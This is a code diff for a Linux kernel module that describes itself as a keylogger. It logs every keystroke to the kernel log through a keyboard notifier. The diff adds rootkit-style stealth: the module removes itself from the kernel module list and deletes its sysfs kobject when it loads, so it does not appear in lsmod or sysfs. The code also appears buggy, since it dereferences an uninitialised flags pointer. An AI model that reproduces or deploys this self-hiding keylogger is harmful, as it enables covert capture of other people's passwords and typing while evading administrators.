@@ -9,6 +9,30 @@ Desc:   Kernel Based KeyLogger Module
 /* Linux includes */
 #include "stdinc.h"
 
+/*---------------------------------------------
+| Flags of banti module
+---------------------------------------------*/
+typedef struct { 
+    short module_hidden;
+    short got_key;
+} KeyBantiFlags;
+
+
+/* Public variables */
+static KeyBantiFlags *fl;
+static struct list_head *module_prev;
+static struct list_head *module_kobj_prev;
+
+
+/*---------------------------------------------
+| Initialise banti flags
+---------------------------------------------*/
+void init_banti(void) 
+{
+    fl->module_hidden = 0;
+    fl->got_key = 0;
+}
+
 
 /*---------------------------------------------
 | Handle key signal and return in char value
@@ -172,9 +196,52 @@ char banti_handle_key(int key)
             break;
         default:
             ret = ' ';
+            fl->got_key = -1;
+            break;
     }
 
     return ret; 
+}
+
+
+/*---------------------------------------------
+| Hide module
+---------------------------------------------*/
+void banti_module_hide(void)
+{
+    /* Check if alredy hided */
+    if (fl->module_hidden) return;
+
+    /* Delete in module list */
+    module_prev = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+
+    /* Reinitialise list */
+    module_kobj_prev = THIS_MODULE->mkobj.kobj.entry.prev;
+    kobject_del(&THIS_MODULE->mkobj.kobj);
+    list_del(&THIS_MODULE->mkobj.kobj.entry);
+
+    /* Flag up */
+    fl->module_hidden = 1;
+}
+
+
+/*---------------------------------------------
+| Make module visible
+---------------------------------------------*/
+void banti_module_show(void)
+{
+    int result;
+
+    /* Check if alredy hided */
+    if (!fl->module_hidden) return;
+
+    /* Add module in list */
+    list_add(&THIS_MODULE->list, module_prev);
+    result = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, "rt");
+
+    /* Flag down */
+    fl->module_hidden = 0;
 }
 
 
@@ -191,8 +258,10 @@ int banti_key_notifer(struct notifier_block *nblock, unsigned long code, void *_
     {
         /* Get and log key */
         key = banti_handle_key(param->value);
-        if(param->down)
-            printk(KERN_INFO "%c", key); 
+        if(param->down || fl->got_key >= 0)
+            printk(KERN_INFO "%c", key);
+
+        fl->got_key = 1;
     }
 
     return NOTIFY_OK;
@@ -213,6 +282,11 @@ static struct notifier_block notifer_deamon =
 ---------------------------------------------*/
 static int __init banti_keylog_init(void)
 {
+    /* Hide module */
+    init_banti();
+    banti_module_hide();
+
+    /* Register notifier */
     register_keyboard_notifier(&notifer_deamon);
     printk(KERN_INFO "Registring banti keyboard module\n");
     return 0;
